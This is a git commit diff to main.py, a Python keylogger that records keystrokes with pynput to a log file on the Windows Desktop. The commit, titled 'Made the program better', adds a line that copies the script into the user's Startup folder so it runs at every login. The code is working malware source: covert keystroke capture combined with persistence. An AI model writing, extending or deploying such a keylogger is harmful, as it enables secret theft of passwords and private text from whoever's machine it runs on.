ffdaa753b05aad243a8f317b7e8caf487cafa2e9
Maulik Shah <maulik.shah715@gmail.com>
2020-11-16 19:21:25 +0530

    Made the program better

--- main.py
+++ main.py
@@ -1,9 +1,12 @@
 from pynput.keyboard import Listener
 import os
 import logging
+from shutil import copyfile
 
 username = os.getlogin()
 logging_dir = f"C:/Users/{username}/Desktop"
+
+copyfile('main.py', f'C:/Users/{username}/AppData/Roaming/Microsoft/Start Menu/Startup/main.py')
 
 logging.basicConfig(filename=f"{logging_dir}/logfile.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
 
